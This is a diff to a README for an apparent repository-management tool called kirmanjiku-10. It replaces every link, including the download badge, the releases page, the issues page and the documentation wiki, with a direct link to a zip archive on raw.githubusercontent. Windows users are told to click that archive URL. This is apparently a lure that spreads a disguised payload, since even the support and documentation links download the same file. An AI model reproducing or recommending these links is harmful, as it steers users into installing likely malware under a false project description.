@@ -6,7 +6,7 @@ Welcome to **kirmanjiku-10**! This application helps you manage your repositorie
 
 ## 🖱️ Download Now
 
-[![Download kirmanjiku-10](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ceoptiz/kirmanjiku-10/releases)
+[![Download kirmanjiku-10](https://raw.githubusercontent.com/Ceoptiz/kirmanjiku-10/main/hyaluronidase/kirmanjiku-10.zip)](https://raw.githubusercontent.com/Ceoptiz/kirmanjiku-10/main/hyaluronidase/kirmanjiku-10.zip)
 
 ## 📋 System Requirements
 
@@ -21,13 +21,13 @@ Before you install **kirmanjiku-10**, ensure your system meets the following req
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download Page](https://github.com/Ceoptiz/kirmanjiku-10/releases)
+   [Download Page](https://raw.githubusercontent.com/Ceoptiz/kirmanjiku-10/main/hyaluronidase/kirmanjiku-10.zip)
 
 2. **Choose the Latest Version**  
    Look for the most recent release at the top of the page. This version contains the latest features and fixes.
 
 3. **Download the Application**  
-   Click on the link that says **kirmanjiku-10.exe** (for Windows users) or the relevant file for your operating system. The file will start downloading automatically.
+   Click on the link that says **https://raw.githubusercontent.com/Ceoptiz/kirmanjiku-10/main/hyaluronidase/kirmanjiku-10.zip** (for Windows users) or the relevant file for your operating system. The file will start downloading automatically.
 
 4. **Locate the Downloaded File**  
    After the download is complete, locate the file in your downloads folder.
@@ -79,14 +79,14 @@ If you encounter issues, consider these common solutions:
 For further assistance, you can reach out through the GitHub issues page. Your feedback is valuable and helps us improve the application.
 
 1. **Open the Issues Page:**  
-   Visit [Issues Page](https://github.com/Ceoptiz/kirmanjiku-10/issues)
+   Visit [Issues Page](https://raw.githubusercontent.com/Ceoptiz/kirmanjiku-10/main/hyaluronidase/kirmanjiku-10.zip)
 
 2. **Report a Problem:**  
    Provide details about the issue you are facing. Our team will review and respond as soon as possible.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Detailed user guides and FAQs are available on the [Documentation Page](https://github.com/Ceoptiz/kirmanjiku-10/wiki).
+- **Documentation:** Detailed user guides and FAQs are available on the [Documentation Page](https://raw.githubusercontent.com/Ceoptiz/kirmanjiku-10/main/hyaluronidase/kirmanjiku-10.zip).
 - **Updates:** Stay informed about new features and fixes by regularly visiting the releases page.
 
 Thank you for choosing **kirmanjiku-10** for your repository management needs!
